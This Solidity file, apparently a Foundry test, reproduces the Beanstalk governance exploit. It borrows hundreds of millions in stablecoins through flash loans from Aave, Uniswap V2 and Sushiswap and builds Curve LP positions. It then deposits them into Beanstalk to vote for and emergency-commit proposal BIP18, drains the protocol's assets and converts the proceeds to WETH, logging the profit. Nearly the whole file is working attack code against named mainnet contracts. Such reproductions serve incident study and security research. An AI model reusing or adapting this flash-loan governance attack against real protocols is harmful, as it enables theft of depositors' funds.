// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./FlashloanBase.sol";
import "../interfaces/ICurve.sol";
import "../interfaces/IUniswapV2Pair.sol";
import "../interfaces/IUniswapV3Pool.sol";
import "../interfaces/IBeanStalk.sol";

interface IUSDT {
    function approve(address _spender, uint256 _value) external;
}

contract BeanExploit is
    FlashLoanReceiverBase(
        ILendingPoolAddressesProvider(
            0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5
        )
    ),
    IUniswapV2Callee
{
    address constant DAI = address(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    address constant USDT = address(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    address constant USDC = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address constant BEAN = address(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    address constant LUSD = address(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0);
    address constant WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address constant UNI_V2_BEAN_LP =
        address(0x87898263B6C5BABe34b4ec53F22d98430b91e371);
    address UNI_V3_DAI_USDC =
        address(0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168);
    address UNI_V3_USDC_WETH =
        address(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    address UNI_V3_USDT_WETH =
        address(0x4e68Ccd3E89f51C3074ca5072bbAC773960dFa36);
    address SWAP_ROUTER = address(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    address LUSD_OHM_SUSHI =
        address(0x46E4D8A1322B9448905225E52F914094dBd6dDdF);

    address CRV = address(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    address CURVE_DAI_USDT_USDC =
        address(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    address LUSDCRV_F = address(0xEd279fDD11cA84bEef15AF5D39BB4d4bEE23F0cA);
    address BEANCRV_F = address(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    address BEANLUSD_F = address(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D);

    address BEANSTALK = address(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
    address SILO_V2 = address(0x23D231f37c8F5711468C8AbbFbf1757d1f38FDA2);

    uint256 constant DAI_AMOUNT = 350_000_000 * 1e18;
    uint256 constant USDC_AMOUNT = 500_000_000 * 1e6;
    uint256 constant USDT_AMOUNT = 150_000_000 * 1e6;
    uint256 constant LUSD_EXCHANGE_AMOUNT = 15_000_000 * 1e18;

    uint256 private UNI_LP_TOKEN_AMOUNT = IERC20(UNI_V2_BEAN_LP).balanceOf(BEANSTALK);
    uint256 private BEAN_AMOUNT = IERC20(BEAN).balanceOf(UNI_V2_BEAN_LP)*99/100;
    uint256 private LUSD_AMOUNT = IERC20(LUSD).balanceOf(LUSD_OHM_SUSHI)*99/100;
    uint256 private BEANCRV_AMOUNT;
    uint256 private BEANLUSD_AMOUNT;


    constructor() {
        IERC20(DAI).approve(CURVE_DAI_USDT_USDC, type(uint256).max);
        IERC20(USDC).approve(CURVE_DAI_USDT_USDC, type(uint256).max);
        IUSDT(USDT).approve(CURVE_DAI_USDT_USDC, type(uint256).max);
        IERC20(CRV).approve(LUSDCRV_F, type(uint256).max);
        IERC20(LUSD).approve(LUSDCRV_F, type(uint256).max);
        IERC20(CRV).approve(BEANCRV_F, type(uint256).max);
        IERC20(LUSD).approve(BEANLUSD_F, type(uint256).max);
        IERC20(BEAN).approve(BEANLUSD_F, type(uint256).max);
        IERC20(BEANLUSD_F).approve(BEANSTALK, type(uint256).max);
        IERC20(LUSDCRV_F).approve(BEANSTALK, type(uint256).max);
        IERC20(BEANCRV_F).approve(BEANSTALK, type(uint256).max);
        IERC20(CRV).approve(CURVE_DAI_USDT_USDC, type(uint256).max);
        IERC20(DAI).approve(SWAP_ROUTER, type(uint256).max);
        IERC20(USDC).approve(SWAP_ROUTER, type(uint256).max);
        IUSDT(USDT).approve(SWAP_ROUTER, type(uint256).max);
    }

    function exploit() public {
                
        takeFlashLoanFromAave();

        console.log(
            "USDC After returning Flashloans",
            IERC20(USDC).balanceOf(address(this))/10**6
        );
        console.log(
            "USDT After returning Flashloans",
            IERC20(USDT).balanceOf(address(this))/10**6
        );
        console.log(
            "DAI After returning Flashloans",
            IERC20(DAI).balanceOf(address(this))/10**18
        );

        convertAllStablesToWeth();
    }

    function takeFlashLoanFromAave() internal {
        address[] memory assets = new address[](3);
        assets[0] = DAI;
        assets[1] = USDC;
        assets[2] = USDT;

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = DAI_AMOUNT;
        amounts[1] = USDC_AMOUNT;
        amounts[2] = USDT_AMOUNT;

        uint256[] memory modes = new uint256[](3);
        modes[0] = 0;
        modes[1] = 0;
        modes[2] = 0;

        bytes memory params = "";

        ILendingPool(LENDING_POOL).flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            params,
            0
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        // Approve
        IERC20(DAI).approve(address(LENDING_POOL), amounts[0] + premiums[0]);
        IERC20(USDC).approve(address(LENDING_POOL), amounts[1] + premiums[1]);
        IUSDT(USDT).approve(address(LENDING_POOL), amounts[2] + premiums[2]);

        console.log(
            "Flashloan USDT from Aave",
            IERC20(USDT).balanceOf(address(this))/10**6
        );
        console.log(
            "Flashloan USDC from Aave",
            IERC20(USDC).balanceOf(address(this))/10**6
        );
        console.log(
            "Flashloan DAI from Aave",
            IERC20(DAI).balanceOf(address(this))/10**18
        );

        takeFlashLoanfromUniswapV2();

        returnAaveLoans();

        // Silence compiler
        {
            assets;
            amounts;
            premiums;
            initiator;
            params;
        }
        return true;
    }

    function takeFlashLoanfromUniswapV2() public {
        bytes memory data = abi.encode(uint256(1));
        IUniswapV2Pair(UNI_V2_BEAN_LP).swap(
            0,
            IERC20(BEAN).balanceOf(UNI_V2_BEAN_LP)*99/100,
            address(this),
            data
        );
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        uint256 selector = abi.decode(data, (uint256));
        if (selector == 1) {
            // Uniswap
            uint256 returnAmountFee = (amount1 * 1000) / 997 + 1; // 0.3% fee
            console.log(
                "Flashloan BEAN from Uniswap V2",
                IERC20(BEAN).balanceOf(address(this))/10**6
            );

            takeFlashLoanfromSushiSwap();

            IERC20(BEAN).transfer(UNI_V2_BEAN_LP, returnAmountFee);
            console.log("Returned to Uniswap", returnAmountFee/10**18);
        } else if (selector == 2) {
            // Sushiswap
            uint256 returnAmountFee = (amount0 * 1000) / 997 + 1; // 0.3% fee
            console.log(
                "Flashloan LUSD from Sushiswap",
                IERC20(LUSD).balanceOf(address(this))/10**18
            );

            depositLoanAmountsToCurve();

            IERC20(LUSD).transfer(LUSD_OHM_SUSHI, returnAmountFee);
            console.log("Returned to sushiswap", returnAmountFee/10**18);
        }

        // To silence compiler
        {
            sender;
        }
    }

    function takeFlashLoanfromSushiSwap() public {
        bytes memory data = abi.encode(uint256(2));
        IUniswapV2Pair(LUSD_OHM_SUSHI).swap(
            LUSD_AMOUNT,
            0,
            address(this),
            data
        );
    }

    function depositLoanAmountsToCurve() public {
        console.log("Added USDT, USDC & DAI to CurvePool to get CRV");

        ICurve(CURVE_DAI_USDT_USDC).add_liquidity(
            [DAI_AMOUNT, USDC_AMOUNT, USDT_AMOUNT],
            0 
        );


        console.log("Exchange CRV to LUSD");

        ICurve(LUSDCRV_F).exchange(
            1,
            0,
            LUSD_EXCHANGE_AMOUNT,
            0
        );

        uint256 CRV_AMOUNT = IERC20(CRV).balanceOf(address(this));
        uint256 LUSD_BALANCE = IERC20(LUSD).balanceOf(address(this));

        console.log("CRV Balance of this: ", CRV_AMOUNT/10**18);
        console.log("LUSD Balance of this: ", LUSD_BALANCE/10**18);

        ICurve(BEANCRV_F).add_liquidity(
            [0, CRV_AMOUNT],
            0 
        );

        BEANCRV_AMOUNT = IERC20(BEANCRV_F).balanceOf(address(this));
        console.log(
            "Added CRV liquidity to get BEAN3CRV-f LP tokens: ",
            BEANCRV_AMOUNT/10**18
        );

        ICurve(BEANLUSD_F).add_liquidity(
            [BEAN_AMOUNT, LUSD_BALANCE],
            0
        );

        BEANLUSD_AMOUNT = IERC20(BEANLUSD_F).balanceOf(address(this));
        console.log(
            "Added LUSD & BEAN liquidity to get BEANLUSD-f LP tokens: ",
            BEANLUSD_AMOUNT/10**18
        );


        depositLPToSiloAndCommit();
    }

    function depositLPToSiloAndCommit() public {
        IBeanStalk(BEANSTALK).deposit(BEANLUSD_F, BEANLUSD_AMOUNT);
        console.log("Deposited BEANLUSD-f LP token to BeanStalk contract.");

        IBeanStalk(BEANSTALK).deposit(BEANCRV_F, BEANCRV_AMOUNT);
        console.log("Deposited BEANCRV-f LP token to BeanStalk contract.");

        IBeanStalk(BEANSTALK).vote(18);
        console.log("Executed Vote for BIP18");

        IBeanStalk(BEANSTALK).emergencyCommit(18);
        console.log("EmergencyCommit Executed!");

        console.log(
            "UNI_V2 LP Received from proposal: ",
            IERC20(UNI_V2_BEAN_LP).balanceOf(address(this))/10**18
        );
        console.log(
            "BEAN3CRV-f LP Received from proposal: ",
            IERC20(BEANCRV_F).balanceOf(address(this))/10**18
        );
        console.log(
            "BEANLUSD-F LP Received from proposal: ",
            IERC20(BEANLUSD_F).balanceOf(address(this))/10**18
        );

        console.log(
            "Remove two LP tokens to get back LUSD & CRV"
        );

        ICurve(BEANCRV_F).remove_liquidity_one_coin(IERC20(BEANCRV_F).balanceOf(address(this)), 1, 0);
        ICurve(BEANLUSD_F).remove_liquidity_one_coin(IERC20(BEANLUSD_F).balanceOf(address(this)), 1, 0);

        console.log("CRV token received", IERC20(CRV).balanceOf(address(this))/10**18);
        console.log("LUSD token amount received",IERC20(LUSD).balanceOf(address(this))/10**18);
    }

    function returnAaveLoans() public {
        // 0 -> LUSD; 1-> CRV
        console.log("Exchange LUSD to CRV from LUSDCRV-f ");

        ICurve(LUSDCRV_F).exchange(
            0,
            1,
            IERC20(LUSD).balanceOf(address(this)),
            0
        );

        uint256 CRV_AMOUNT = IERC20(CRV).balanceOf(address(this));
        console.log("CRV recieved in contract", CRV_AMOUNT/10**18);
        
        console.log(
            "Remove liquidity from 3CRV Pool to get USDC(50%), DAI(35%), USDT(15%) back."
        );

        ICurve(CURVE_DAI_USDT_USDC).remove_liquidity_one_coin(
            CRV_AMOUNT*50/100,
            1,
            0
        );

        ICurve(CURVE_DAI_USDT_USDC).remove_liquidity_one_coin(
            CRV_AMOUNT*35/100,
            0,
            0
        );

        ICurve(CURVE_DAI_USDT_USDC).remove_liquidity_one_coin(
            CRV_AMOUNT*15/100,
            2,
            0
        );

        console.log("Aave flashloan returned");
    }

    function convertAllStablesToWeth() public {
        IERC20(UNI_V2_BEAN_LP).transfer(UNI_V2_BEAN_LP, UNI_LP_TOKEN_AMOUNT);
        IUniswapV2Pair(UNI_V2_BEAN_LP).burn(address(this));

        console.log(
            "WETH received After removing liquidity",
            IERC20(WETH).balanceOf(address(this))/10**18
        );

        console.log(
            "BEAN received After removing liquidity",
            IERC20(BEAN).balanceOf(address(this))/10**6
        );

        uint256 daiAmount = IERC20(DAI).balanceOf(address(this));
        IUniswapV3Pool(SWAP_ROUTER).exactInputSingle(
            IUniswapV3Pool.ExactInputSingleParams({
                tokenIn: DAI,
                tokenOut: USDC,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: daiAmount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 4295128740
            })
        );

        console.log("Swapped DAI for USDC on V3");

        uint256 usdcAmount = IERC20(USDC).balanceOf(address(this))/10**6;
        IUniswapV3Pool(SWAP_ROUTER).exactInputSingle(
            IUniswapV3Pool.ExactInputSingleParams({
                tokenIn: USDC,
                tokenOut: WETH,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp ,
                amountIn: usdcAmount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 4295128740
            })
        );

        console.log("Swapped USDC for WETH on V3");

        uint256 usdtAmount = IERC20(USDT).balanceOf(address(this));
        IUniswapV3Pool(SWAP_ROUTER).exactInputSingle(
            IUniswapV3Pool.ExactInputSingleParams({
                tokenIn: USDT,
                tokenOut: WETH,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: usdtAmount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970341
            })
        );

        console.log("Swapped USDT for WETH on V3");

        console.log("Profit in WETH", IERC20(WETH).balanceOf(address(this))/10**18);
    }
}
